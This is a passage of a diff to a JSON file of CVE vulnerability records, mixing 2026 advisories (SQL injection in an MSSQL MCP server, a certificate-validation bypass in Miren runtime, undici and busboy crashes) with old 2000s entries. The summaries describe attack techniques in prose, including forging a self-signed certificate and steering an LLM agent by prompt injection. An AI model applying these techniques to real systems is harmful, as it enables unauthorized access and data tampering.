`Request.query()` submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and `xp_cmdshell` enabled) OS command execution. Because `list_databases` is a read-only tool, the `stateFilter` sink makes the reader package injectable as well.\n\n## Impact\n\nAn actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the `read_data` allow/deny validation and the preview/confirmation/`maxRows` safeguards, and conditionally achieve OS command execution.\n\n## Patches\n\nFixed in `@connorbritain/mssql-mcp-core` 0.6.0:\n- All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.\n- The free-form `whereClause` string parameter is removed (breaking change) and replaced with structured, parameterized filters (`{ column, operator, value }`) using an operator allowlist. Values are always bound, never interpolated.\n- `list_databases` validates `stateFilter` against a fixed allowlist before use.\n\nUpgrade the consumer packages: `mssql-mcp-reader` 0.5.0, `mssql-mcp-writer` 0.5.0, `mssql-mcp-server` 0.6.0 (all depend on core `^0.6.0`).\n\n## Workarounds\n\nUpgrading is the only complete fix; the `list_databases` (`stateFilter`) sink is reachable even under `READONLY=true` and in the reader package. As defense in depth, run the server under a least-privilege SQL login with `xp_cmdshell` disabled, and restrict which MCP clients can invoke the tools.",
+      "cvssScore": 8.8,
+      "severity": "High",
+      "published": "2026-11-19",
+      "modified": "2026-11-19",
+      "cwe": {
+        "cwe_id": "CWE-89",
+        "name": "Improper Neutralization of Special Elements used in an SQL Command"
+      },
+      "references": [
+        "https://github.com/ConnorBritain/mssql-mcp-core/security/advisories/GHSA-2m9m-6cr5-9x25",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-63129",
+        "https://github.com/ConnorBritain/mssql-mcp-core/pull/1",
+        "https://github.com/ConnorBritain/mssql-mcp-core/commit/227e2efc4e3311c477b7ae509c3ae15437a4f815",
+        "https://github.com/ConnorBritain/mssql-mcp-core/commit/a9727f83768598e4fdbddfbc717ccfebb84ae7af"
+      ],
+      "vulnerableProducts": [
+        "@connorbritain/mssql-mcp-core npm",
+        "@connorbritain/mssql-mcp-reader npm",
+        "@connorbritain/mssql-mcp-writer npm",
+        "@connorbritain/mssql-mcp-server npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-75521",
+      "summary": "### Summary\n\n  The Miren Runtime RPC server (QUIC/HTTP3, default port `:8443`) requested TLS\n  client certificates but never verified that a presented certificate chained to\n  the cluster Certificate Authority. Because a client-certificate identity is\n  granted a blanket RBAC bypass, any party able to reach the RPC listener could\n  present a forged, self-signed certificate and be authenticated as a cluster\n  **superuser** — no valid CA signature, credential, or prior authorization\n  required.\n\n### Impact\n\n  This is a complete, unauthenticated authentication bypass against the cluster\n  control plane. An attacker who can reach the RPC port can perform any RPC\n  operation with full privileges: enumerate and manipulate entities, apps,\n  sandboxes, disks, and other cluster resources. This yields full compromise of\n  confidentiality, integrity, and availability of the cluster and everything it\n  orchestrates.\n\n  Exposure is network-reachability–gated only. Deployments that expose `:8443`\n  beyond a trusted network (e.g. `0.0.0.0/0`) are remotely exploitable from the\n  internet by anyone; deployments that restrict `:8443` to a trusted network are\n  exploitable by any party with access to that network.\n\nDue to a lack of ability to detect if the RPC has been accessed unauthorized,\nMiren recommends that all applications are redeployed and any credentials reference\nin environment variables are rotated. A read-only script to help review standing access,\nrecent changes, and the exact secrets to rotate is available at https://github.com/mirendev/runtime/tree/089582a132f7fc1e1d5b5c0aee1e0911535fed53/scripts/security/audit-exposure.\n\n### Details\n\n  Three independent factors combined to produce the bypass:\n\n  1. **The listener never verified the client-certificate chain.** When a cluster\n     CA was configured, the RPC listener used `tls.RequestClientCert`, which\n     requests a client certificate but does not verify it against the configured\n     `ClientCAs`. `tls.ConnectionState.VerifiedChains` was therefore always empty,\n     and no `VerifyPeerCertificate`/`VerifyConnection` hook re-checked the chain.\n\n  2. **The authenticator derived identity from an unverified certificate.** The\n     RPC authenticators read `PeerCertificates[0].Subject.CommonName` directly as\n     the caller identity, with method `cert`, without checking that the chain had\n     been verified.\n\n  3. **Authorization granted a blanket bypass to certificate identities.** The\n     authorizer returned \"allowed\" for any `cert`-method identity, skipping all\n     RBAC checks.\n\n  Go's TLS client only presents a certificate whose issuer Distinguished Name\n  matches a CA advertised by the server, but that comparison is on the (public,\n  non-secret) DN bytes only — it does not require a valid signature from the CA.\n  An attacker can therefore mint a self-signed certificate whose **issuer DN is\n  byte-identical to the cluster CA subject**, signed with an attacker-controlled\n  key. The stock client presents it, and the vulnerable server accepts it and\n  trusts its CommonName as a superuser identity.\n\n### Patches\n\n  Fixed by verifying the client-certificate chain before trusting it:\n\n  - The listener now uses `tls.VerifyClientCertIfGiven` when a cluster CA is\n    configured. A presented certificate must chain to the configured CA to\n    complete the handshake, while certless callers (JWT/OIDC, which authenticate\n    via the `Authorization` header) are still admitted.\n  - As defense in depth, both RPC authenticators now require a non-empty\n    `VerifiedChains` before deriving an identity from a client certificate.\n\n  Users should upgrade to the patched release and restart the server so the\n  new listener configuration takes effect.\n\n### Workarounds\n\n  Until the patch is deployed, restrict network access to the RPC port (`:8443`)\n  so that it is not reachable from untrusted networks — remove any\n  `0.0.0.0/0` ingress and limit it to trusted management networks. This is a\n  containment measure only and does not remove the underlying vulnerability.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2026-11-19",
+      "modified": "2026-11-19",
+      "cwe": {
+        "cwe_id": "CWE-295",
+        "name": "Improper Certificate Validation"
+      },
+      "references": [
+        "https://github.com/mirendev/runtime/security/advisories/GHSA-8fh7-7q4q-cq52",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-75521",
+        "https://github.com/mirendev/runtime/commit/e2159c8c8559da3f1c1485b463c794d656cd2fe4",
+        "https://github.com/mirendev/runtime/releases/tag/v0.11.1",
+        "https://github.com/advisories/GHSA-8fh7-7q4q-cq52"
+      ],
+      "vulnerableProducts": [
+        "miren.dev/runtime go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1394",
+      "summary": "Apache Tomcat 4.0.5 and earlier, when using both the invoker servlet and the default servlet, allows remote attackers to read source code for server files or bypass certain protections, a variant of CAN-2002-1148.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-01-17",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/9010",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-050",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13681",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A636",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A675"
+        "http://issues.apache.org/bugzilla/show_bug.cgi?id=13365",
+        "http://marc.info/?l=bugtraq&m=103470282514938&w=2",
+        "http://marc.info/?l=tomcat-dev&m=103417249325526&w=2",
+        "http://www.debian.org/security/2003/dsa-225",
+        "http://www.redhat.com/support/errata/RHSA-2003-075.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1088",
-      "summary": "Microsoft Outlook 8.5 and earlier, and Outlook Express 5 and earlier, with the \"Automatically put people I reply to in my address book\" option enabled, do not notify the user when the \"Reply-To\" address is different than the \"From\" address, which could allow an untrusted remote attacker to spoof legitimate addresses and intercept email from the client that is intended for another user.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-06-05",
+      "id": "CVE-2002-1395",
+      "summary": "Internet Message (IM) 141-18 and earlier uses predictable file and directory names, which allows local users to (1) obtain unauthorized directory permissions via a temporary directory used by impwagent, and (2) overwrite and create arbitrary files via immknmz.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2003-01-17",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3BEN-US%3Bq234241",
-        "http://www.securityfocus.com/archive/1/188752",
-        "http://www.securityfocus.com/bid/2823",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6655",
-        "http://support.microsoft.com/default.aspx?scid=kb%3BEN-US%3Bq234241"
+        "http://secunia.com/advisories/8166",
+        "http://secunia.com/advisories/8242",
+        "http://www.debian.org/security/2002/dsa-202",
+        "http://www.iss.net/security_center/static/10766.php",
+        "http://www.iss.net/security_center/static/10767.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0732",
-      "summary": "Cross-site scripting vulnerability in MyGuestbook 1.0 allows remote attackers to execute arbitrary script or inject HTML via fields such as (1) user name or (2) comments.",
+      "id": "CVE-2001-1252",
+      "summary": "Network Associates PGP Keyserver 7.0 allows remote attackers to bypass authentication and access the administrative web interface via URLs that directly access cgi-bin instead of keyserver/cgi-bin for the programs (1) console, (2) cs, (3) multi_config and (4) directory.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-09-28",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-09/0230.html",
+        "http://www.iss.net/security_center/static/7203.php",
+        "http://www.osvdb.org/1955",
+        "http://www.osvdb.org/4193",
+        "http://www.pgp.com/support/product-advisories/keyserver.asp"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1815",
+      "summary": "Directory traversal vulnerability in source.php and source.cgi in Aquonics File Manager 1.5 allows remote attackers to read arbitrary files via a ..  (dot dot) in the URL.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/288415",
+        "http://www.iss.net/security_center/static/9929.php",
+        "http://www.securityfocus.com/bid/5533",
+        "http://online.securityfocus.com/archive/1/288415",
+        "http://www.iss.net/security_center/static/9929.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0649",
+      "summary": "Multiple buffer overflows in the Resolution Service for Microsoft SQL Server 2000 and Microsoft Desktop Engine 2000 (MSDE) allow remote attackers to cause a denial of service or execute arbitrary code via UDP packets to port 1434 in which (1) a 0x04 byte that causes the SQL Monitor thread to generate a long registry key name, or (2) a 0x08 byte with a long string causes heap corruption, as exploited by the Slammer/Sapphire worm.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": "CWE-119",
+      "references": [
+        "http://marc.info/?l=bugtraq&m=102760196931518&w=2",
+        "http://marc.info/?l=ntbugtraq&m=102760479902411&w=2",
+        "http://secunia.com/advisories/7945",
+        "http://www.cert.org/advisories/CA-2002-22.html",
+        "http://www.cert.org/advisories/CA-2003-04.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0650",
+      "summary": "The keep-alive mechanism for Microsoft SQL Server 2000 allows remote attackers to cause a denial of service (bandwidth consumption) via a \"ping\" style packet to the Resolution Service (UDP port 1434) with a spoofed IP address of another SQL Server system, which causes the two servers to exchange packets in an infinite loop.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=102760196931518&w=2",
+        "http://marc.info/?l=ntbugtraq&m=102760479902411&w=2",
+        "http://www.iss.net/security_center/static/9662.php",
+        "http://www.osvdb.org/878",
+        "http://www.securityfocus.com/bid/5312"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0655",
+      "summary": "OpenSSL 0.9.6d and earlier, and 0.9.7-beta2 and earlier, does not properly handle ASCII representations of integers on 64 bit platforms, which could allow attackers to cause a denial of service and possibly execute arbitrary code.",
       "cvssScore": 7.5,
       "severity": "High",
       "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0422.html",
-        "http://www.iss.net/security_center/static/8968.php",
-        "http://www.levcgi.com/programs.cgi?program=myguestbook&action=history",
-        "http://www.securityfocus.com/bid/4651",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0422.html"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.0.txt",
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.1.txt",
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-02:33.openssl.asc",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000513",
+        "http://www.cert.org/advisories/CA-2002-23.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-85014",
-      "summary": "## Impact\n\nundici's `WebSocketStream` crashes the client process when a WebSocket connection is closed abruptly without a close handshake. On such an unclean close, the internal socket-close handler calls `abort()` on the writable stream even when the application holds a writer lock. Per the WHATWG Streams standard, aborting a locked stream returns a promise that rejects with a `TypeError`, and the handler discards that promise. The unobserved rejection surfaces as an `unhandledRejection` and, under Node.js's default behavior, terminates the process.\n\nA malicious or compromised WebSocket server can crash a client with a single connection teardown (a TCP reset, a proxy teardown, or a protocol-violating frame). Affected applications are those using the `WebSocketStream` API and writing through a writer, which is the standard way to write.\n\nAll releases from undici 7.0.0 are affected. WebSocketStream was introduced in 7.0.0.\n\n## Patches\n\nUpgrade to undici v7.29.1 or v8.10.2.\n\n## Workarounds\n\nNo workaround is available.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-09-29",
-      "modified": "2026-09-29",
-      "cwe": {
-        "cwe_id": "CWE-248",
-        "name": "Uncaught Exception"
-      },
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-rx4f-c7p8-82vq",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-85014",
-        "https://github.com/nodejs/undici/commit/1858656ebb1e919311c1f31613dfd581b7214349",
-        "https://github.com/nodejs/undici/commit/662d0ea671fe64139e79533c913fce412765e1d7",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "vulnerableProducts": [
-        "undici npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-19481",
-      "summary": "### Impact\n\nVersions of `@fastify/busboy` from 1.0.0 and prior to 3.2.1 are vulnerable to a Denial of Service. The multipart header parser stores part-header names on a plain JavaScript object, so a part header named `__proto__` or `constructor` resolves to an inherited value that is not an array, and the parser throws `TypeError: this.header[h].push is not a function`. Through the documented `req.pipe(busboy)` integration this surfaces as an `error` event, while direct `write()`/`end()` usage throws synchronously and can terminate the Node.js process if uncaught. The parser runs before application middleware, so any unauthenticated client that can submit multipart/form-data is affected.\n\n### Patches\n\nFixed in version 3.2.1.\n\n### Workarounds\n\nAttach an `error` listener to the Busboy stream so the parser failure is handled rather than crashing the process, and wrap direct `write()`/`end()` calls in a try/catch. Upgrading to 3.2.1 removes the failure entirely.",
+      "id": "CVE-2002-0656",
+      "summary": "Buffer overflows in OpenSSL 0.9.6d and earlier, and 0.9.7-beta2 and earlier, allow remote attackers to execute arbitrary code via (1) a large client master key in SSL2 or (2) a large session ID in SSL3.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-10-02",
-      "modified": "2026-10-02",
-      "cwe": {
-        "cwe_id": "CWE-754",
-        "name": "Improper Check for Unusual or Exceptional Conditions"
-      },
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/fastify/busboy/security/advisories/GHSA-x8mw-p69m-v3mx",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-19481",
-        "https://github.com/fastify/busboy/commit/957a24b66d5915e6d0a6ac988c9dbcee86373e9b",
-        "https://cna.openjsf.org/security-advisories.html",
-        "https://github.com/fastify/busboy/releases/tag/v3.2.1"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.0.txt",
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.1.txt",
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-02:33.openssl.asc",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000513",
+        "http://www.cert.org/advisories/CA-2002-23.html"
       ],
-      "vulnerableProducts": [
-        "@fastify/busboy npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0443",
-      "summary": "The web interface server in HP Web JetAdmin 5.6 allows remote attackers to read arbitrary files via a .. (dot dot) attack.",
+      "id": "CVE-2002-0657",
+      "summary": "Buffer overflow in OpenSSL 0.9.7 before 0.9.7-beta3, with Kerberos enabled, allows attackers to execute arbitrary code via a long master key.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2000-05-24",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0281.html",
-        "http://www.osvdb.org/1350",
-        "http://www.securityfocus.com/bid/1243",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0281.html",
-        "http://www.osvdb.org/1350"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.0.txt",
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-033.1.txt",
+        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-02:33.openssl.asc",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000513",
+        "http://www.cert.org/advisories/CA-2002-23.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0444",
-      "summary": "HP Web JetAdmin 6.0 allows remote attackers to cause a denial of service via a malformed URL to port 8000.",
-      "cvssScore": 5,
+      "id": "CVE-2004-0342",
+      "summary": "WFTPD Pro Server 3.21 Release 1, with the XeroxDocutech option enabled, allows local users to cause a denial of service (crash) via a (1) MKD or (2) XMKD command that causes an absolute path of 260 characters to be used, which overwrites a cookie with a null character, possibly due to an off-by-one error.",
+      "cvssScore": 5.5,
       "severity": "Medium",
-      "published": "2000-05-24",
+      "published": "2004-11-23",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-193",
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0277.html",
-        "http://www.securityfocus.com/bid/1246",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0277.html",
-        "http://www.securityfocus.com/bid/1246"
+        "http://marc.info/?l=bugtraq&m=107801142924976&w=2",
+        "http://secunia.com/advisories/11001",
+        "http://www.osvdb.org/4116",
+        "http://www.securityfocus.com/bid/9767",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15342"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0445",
-      "summary": "The pgpk command in PGP 5.x on Unix systems uses an insufficiently random data source for non-interactive key pair generation, which may produce predictable keys.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2000-05-24",
+      "id": "CVE-2001-1432",
+      "summary": "Directory traversal vulnerability in Cherokee Web Server allows remote attackers to read arbitrary files via a .. (dot dot) in the URL.",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2001-12-29",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-22",
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0273.html",
-        "http://www.cert.org/advisories/CA-2000-09.html",
-        "http://www.osvdb.org/1355",
-        "http://www.securityfocus.com/bid/1251",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0273.html"
+        "http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0085.html",
+        "http://www.kb.cert.org/vuls/id/464827",
+        "http://www.securityfocus.com/bid/3772",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7799",
+        "http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0085.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0916",
-      "summary": "Buffer overflow in Berkeley parallel make (pmake) 2.1.33 and earlier allows a local user to gain root privileges via a long check argument of a shell definition.",
+      "id": "CVE-2001-1433",
+      "summary": "Cherokee web server before 0.2.7 does not properly drop root privileges after binding to port 80, which could allow remote attackers to gain privileges via other vulnerabilities.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-12-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0085.html",
+        "http://www.kb.cert.org/vuls/id/245795",
+        "http://www.securityfocus.com/bid/3771",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7797",
+        "http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0085.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0738",
+      "summary": "MHonArc 2.5.2 and earlier does not properly filter Javascript from archived e-mail messages, which could allow remote attackers to execute script in web clients by (1) splitting the SCRIPT tag into smaller pieces, (2) including the script in a SRC argument to an IMG tag, or (3) using \"&={script}\" syntax.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0260.html",
+        "http://www.debian.org/security/2002/dsa-163",
+        "http://www.iss.net/security_center/static/8894.php",
+        "http://www.mhonarc.org/MHonArc/CHANGES",
+        "http://www.securityfocus.com/bid/4546"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0739",
+      "summary": "Cross-site scripting in PostCalendar 3.02 allows remote attackers to insert arbitrary HTML and script, and steal cookies, by modifying a calendar entry in its preview page.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0288.html",
+        "http://www.iss.net/security_center/static/8899.php",
+        "http://www.securityfocus.com/bid/4563",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0288.html",
+        "http://www.iss.net/security_center/static/8899.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0740",
+      "summary": "Buffer overflow in slrnpull for the SLRN package, when installed setuid or setgid, allows local users to gain privileges via a long -d (SPOOLDIR) argument.",
       "cvssScore": 7.2,
       "severity": "High",
-      "published": "2001-11-21",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=100638919720975&w=2",
-        "http://www.iss.net/security_center/static/7603.php",
-        "http://www.securityfocus.com/bid/3573",
-        "http://marc.info/?l=bugtraq&m=100638919720975&w=2",
-        "http://www.iss.net/security_center/static/7603.php"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0302.html",
+        "http://online.securityfocus.com/archive/1/269667",
+        "http://online.securityfocus.com/archive/1/270235",
+        "http://www.iss.net/security_center/static/8910.php",
+        "http://www.securityfocus.com/bid/4569"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1576",
-      "summary": "Buffer overflow in cron in Caldera UnixWare 7 allows local users to execute arbitrary code via a command line argument.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://cert.uni-stuttgart.de/archive/bugtraq/2001/06/msg00404.html",
-        "http://cert.uni-stuttgart.de/archive/bugtraq/2001/06/msg00404.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0232",
-      "summary": "newsdesk.cgi in News Desk 1.2 allows remote attackers to read arbitrary files via shell metacharacters.",
+      "id": "CVE-2002-0741",
+      "summary": "psyBNC 2.3 allows remote attackers to cause a denial of service (CPU consumption and resource exhaustion) by sending a PASS command with a long password argument and quickly killing the connection, which is not properly terminated by psyBNC.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-03-26",
+      "published": "2002-08-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0042.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0042.html"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0322.html",
+        "http://online.securityfocus.com/archive/1/269131",
+        "http://www.iss.net/security_center/static/8912.php",
+        "http://www.securityfocus.com/bid/4570",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0322.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0233",
-      "summary": "Buffer overflow in micq client 0.4.6 and earlier allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, via a long Description field.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-03-26",
+      "id": "CVE-2004-1490",
+      "summary": "Opera 7.54 and earlier allows remote attackers to spoof file types in the download dialog via dots and non-breaking spaces (ASCII character code 160) in the (1) Content-Disposition or (2) Content-Type headers.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:14.micq.asc",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0307.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0395.html",
-        "http://www.debian.org/security/2001/dsa-012",
-        "http://www.redhat.com/support/errata/RHSA-2001-005.html"
+        "http://secunia.com/advisories/12981",
+        "http://secunia.com/secunia_research/2004-19/advisory/",
+        "http://www.gentoo.org/security/en/glsa/glsa-200502-17.xml",
+        "http://www.opera.com/linux/changelogs/754u1/",
+        "http://www.securityfocus.com/bid/11883"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0571",
-      "summary": "LocalWEB HTTP server 1.2.0 allows remote attackers to cause a denial of service via a long GET request.",
-      "cvssScore": 6.4,
+      "id": "CVE-2004-1491",
+      "summary": "Opera 7.54 and earlier uses kfmclient exec to handle unknown MIME types, which allows remote attackers to execute arbitrary code via a shortcut or launcher that contains an Exec entry.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-07-05",
+      "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/1423",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-07-8&msg=NCBBKFKDOLAGKIAPMILPCEIHCFAA.labs%40ussrback.com",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4896",
-        "http://www.securityfocus.com/bid/1423",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-07-8&msg=NCBBKFKDOLAGKIAPMILPCEIHCFAA.labs%40ussrback.com"
+        "http://lists.suse.com/archive/suse-security-announce/2005-Mar/0007.html",
+        "http://secunia.com/advisories/13447/",
+        "http://www.gentoo.org/security/en/glsa/glsa-200502-17.xml",
+        "http://www.opera.com/linux/changelogs/754u2/",
+        "http://www.securityfocus.com/bid/11901"
       ],
       "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0572",
-      "summary": "The Razor configuration management tool uses weak encryption for its password file, which allows local users to gain privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2000-07-05",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1424",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-07-8&msg=613309F30B6DD2118C020000F809376C05CABD49%40emss03m09.orl.lmco.com",
-        "http://www.securityfocus.com/bid/1424",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-07-8&msg=613309F30B6DD2118C020000F809376C05CABD49%40emss03m09.orl.lmco.com"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1819",
-      "summary": "Directory traversal vulnerability in TinyHTTPD 0.1 .0 allows remote attackers to read or execute arbitrary files via a \"..\" (dot dot) in the URL.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/299287",
-        "http://www.iss.net/security_center/static/10596.php",
-        "http://www.securityfocus.com/bid/6158",
-        "http://online.securityfocus.com/archive/1/299287",
-        "http://www.iss.net/security_center/static/10596.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1820",
-      "summary": "register.php in Ultimate PHP Board (UPB) 1.0 and 1.0b uses an administrative account Admin with a capital \"A,\" but allows a remote attacker to impersonate the administrator by registering an account name of admin with a lower case \"a.\"",
-      "cvssScore": 9.8,
-      "severity": "Critical",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-178",
-      "references": [
-        "http://www.iss.net/security_center/static/9972.php",
-        "http://www.securityfocus.com/archive/1/289417",
-        "http://www.securityfocus.com/bid/5580",
-        "http://www.iss.net/security_center/static/9972.php",
-        "http://www.securityfocus.com/archive/1/289417"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1821",
-      "summary": "Ultimate PHP Board (UPB) 1.0 and 1.0b allows remote authenticated users to gain privileges and perform unauthorized actions via direct requests to (1) admin_members.php, (2) admin_config.php, (3) admin_cat.php, or (4) admin_forum.php.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://securitytracker.com/id?1005198",
-        "http://www.securityfocus.com/bid/5666",
-        "http://securitytracker.com/id?1005198",
